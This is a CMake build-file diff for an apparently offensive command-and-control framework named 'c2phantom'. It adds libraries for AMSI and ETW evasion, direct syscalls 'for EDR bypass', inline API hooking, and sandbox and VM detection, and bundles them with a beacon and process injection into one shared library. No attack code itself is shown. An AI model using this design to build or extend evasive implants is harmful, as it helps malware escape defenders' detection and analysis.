@@ -50,21 +50,72 @@ add_library(c2_process STATIC
 )
 target_include_directories(c2_process PUBLIC ${CMAKE_CURRENT_SOURCE_DIR}/core/process)
 
-# Core evasion library
+# Core evasion library - EXPANDED
 add_library(c2_evasion STATIC
     core/evasion/amsi.c
     core/evasion/amsi.h
+    core/evasion/etw.c
+    core/evasion/etw.h
 )
 target_include_directories(c2_evasion PUBLIC ${CMAKE_CURRENT_SOURCE_DIR}/core/evasion)
+
+# Core syscall library (direct syscalls for EDR bypass)
+add_library(c2_syscall STATIC
+    core/syscall/direct.c
+    core/syscall/direct.h
+)
+target_include_directories(c2_syscall PUBLIC ${CMAKE_CURRENT_SOURCE_DIR}/core/syscall)
+
+# Core hooking library (inline hooks, API interception)
+add_library(c2_hooks STATIC
+    core/hooks/inline.c
+    core/hooks/inline.h
+)
+target_include_directories(c2_hooks PUBLIC ${CMAKE_CURRENT_SOURCE_DIR}/core/hooks)
+
+# Core anti-analysis library (sandbox, VM detection)
+add_library(c2_anti STATIC
+    core/anti/sandbox.c
+    core/anti/sandbox.h
+)
+target_include_directories(c2_anti PUBLIC ${CMAKE_CURRENT_SOURCE_DIR}/core/anti)
+
+# Combined core library for Python FFI
+add_library(c2core SHARED
+    core/crypto/aes.c
+    core/network/beacon.c
+    core/evasion/amsi.c
+    core/evasion/etw.c
+    core/process/inject.c
+    core/syscall/direct.c
+    core/hooks/inline.c
+    core/anti/sandbox.c
+)
+target_link_libraries(c2core ${OPENSSL_LIBRARIES})
+target_include_directories(c2core PUBLIC
+    ${CMAKE_CURRENT_SOURCE_DIR}/core
+    ${OPENSSL_INCLUDE_DIR}
+)
+
+# Platform-specific libraries
+if(WIN32)
+    target_link_libraries(c2core 
+        ntdll 
+        advapi32 
+        psapi
+        tlhelp32
+    )
+endif()
 
 # Test executables
 add_executable(test_crypto tests/test_crypto.c)
 target_link_libraries(test_crypto c2_crypto)
 
 # Install targets
-install(TARGETS c2_crypto c2_network c2_process c2_evasion
+install(TARGETS c2_crypto c2_network c2_process c2_evasion c2_syscall c2_hooks c2_anti c2core
     ARCHIVE DESTINATION lib
     LIBRARY DESTINATION lib
+    RUNTIME DESTINATION bin
 )
 
 install(DIRECTORY core/crypto/ DESTINATION include/c2phantom/crypto
@@ -77,5 +128,14 @@ install(DIRECTORY core/process/ DESTINATION include/c2phantom/process
     FILES_MATCHING PATTERN "*.h"
 )
 install(DIRECTORY core/evasion/ DESTINATION include/c2phantom/evasion
+    FILES_MATCHING PATTERN "*.h"
+)
+install(DIRECTORY core/syscall/ DESTINATION include/c2phantom/syscall
+    FILES_MATCHING PATTERN "*.h"
+)
+install(DIRECTORY core/hooks/ DESTINATION include/c2phantom/hooks
+    FILES_MATCHING PATTERN "*.h"
+)
+install(DIRECTORY core/anti/ DESTINATION include/c2phantom/anti
     FILES_MATCHING PATTERN "*.h"
 )
